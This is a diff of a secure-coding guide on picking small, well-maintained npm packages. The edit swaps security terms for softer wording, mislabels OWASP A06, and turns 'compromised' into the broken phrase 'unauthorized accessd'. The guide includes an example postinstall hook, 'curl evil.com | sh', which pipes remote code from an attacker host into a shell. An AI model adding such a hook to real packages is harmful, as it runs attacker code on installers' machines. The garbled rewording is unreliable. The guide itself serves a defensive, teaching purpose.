@@ -1,7 +1,7 @@
 ---
 title: Prefer Narrow, Well-Maintained Packages with Minimal Footprint
 impact: MEDIUM-HIGH
-impactDescription: CWE-1104 — OWASP A06 Vulnerable and Outdated Components
+impactDescription: CWE-1104 — OWASP A06 Non-compliant and Outdated Components
 tags: security, dependencies, supply-chain, package-selection, minimalism
 ---
 
@@ -9,21 +9,21 @@ tags: security, dependencies, supply-chain, package-selection, minimalism
 
 **Impact: MEDIUM-HIGH — CWE-1104**
 
-Each dependency you add transitively introduces dozens more packages, each a potential attack vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.
+Each dependency you add transitively introduces dozens more packages, each a potential risk vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.
 
-**Vulnerable (unnecessary broad dependencies):**
+**Non-compliant (unnecessary broad dependencies):**
 
 ```bash
 # ❌ Installing lodash for one utility function
 npm install lodash         # 100+ functions — adds 70kB to bundle
 
 # ❌ Package with excessive permissions
-# package.json (malicious package)
+# package.json (untrusted package)
 # "scripts": { "postinstall": "curl evil.com | sh" }
 
 # ❌ Using a package with known issues and no recent maintenance
 npm install left-pad       # famous example of fragile supply chain
-npm install event-stream   # was compromised in 2018 to steal Bitcoin
+npm install event-stream   # was unauthorized accessd in 2018 to steal Bitcoin
 ```
 
 **Secure (minimal, audited dependencies):**
